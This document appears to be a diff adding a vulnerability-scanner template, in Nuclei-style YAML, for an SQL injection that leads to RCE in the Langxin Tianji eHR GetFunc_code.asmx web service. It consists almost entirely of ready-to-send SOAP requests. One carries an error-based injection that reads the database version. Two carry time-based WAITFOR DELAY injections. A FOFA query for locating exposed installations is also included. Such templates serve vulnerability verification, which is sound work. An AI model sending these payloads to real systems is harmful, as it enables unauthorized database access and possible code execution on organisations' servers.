@@ -1,0 +1,38 @@
+id: poc-ltk06btbzavt52xy
+info:
+  name: 朗新天霁eHR GetFunc_code.asmx SQL注入致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ltk06btbzavt52xy
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ltk06btbzavt52xy
+    fofa: body="/default.aspx?ReturnUrl=%2f" && body="silverlight"
+http:
+- raw:
+  - "POST /ws/GetFunc_code.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetMessage\"\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetMessage xmlns=\"http://tempuri.org/\">\n      <a0190>-7952' OR 8812 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(107)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8812=8812) THEN @@VERSION ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(98)+CHAR(113)))-- usJo</a0190>\n    </GetMessage>\n  </soap:Body>\n</soap:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    - 200
+    type: status
+- raw:
+  - "POST /ws/GetFunc_code.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetShortMessage\"\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetShortMessage xmlns=\"http://tempuri.org/\">\n      <a0190>1';WAITFOR DELAY '0:0:5'--</a0190>\n    </GetShortMessage>\n  </soap:Body>\n</soap:Envelope>"
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 500 && duration >= 5
+    condition: and
+- raw:
+  - "POST /ws/GetFunc_code.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetToken\"\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetToken xmlns=\"http://tempuri.org/\">\n      <UserCode>1');WAITFOR DELAY '0:0:5'--</UserCode>\n      <ExpirDate>1</ExpirDate>\n    </GetToken>\n  </soap:Body>\n</soap:Envelope>"
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 500 && duration >= 5
+    condition: and
